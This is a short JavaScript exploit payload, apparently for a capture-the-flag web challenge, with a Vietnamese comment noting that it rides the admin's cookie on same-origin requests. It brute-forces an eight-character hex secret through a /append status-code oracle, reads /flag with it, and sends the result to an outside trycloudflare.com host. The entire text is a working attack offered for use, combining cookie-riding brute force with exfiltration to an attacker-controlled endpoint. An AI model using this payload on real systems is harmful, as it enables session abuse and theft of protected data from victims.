(async()=>{
  const c='0123456789abcdef';
  let s='';
  for(let i=0;i<8;i++){
    for(let j=0;j<16;j++){
      // gọi /append với admin cookie (same-origin, tự gửi cookie)
      const r=await fetch('/append?content='+s+c[j]+'&url=https://append-note-9vot3.instancer.lac.tf/');
      if(r.status===200){s+=c[j];break}
    }
  }
  const f=await fetch('/flag?secret='+s).then(r=>r.text());
  fetch('https://avi-christ-glasses-thats.trycloudflare.com/?flag='+encodeURIComponent(f));
})()
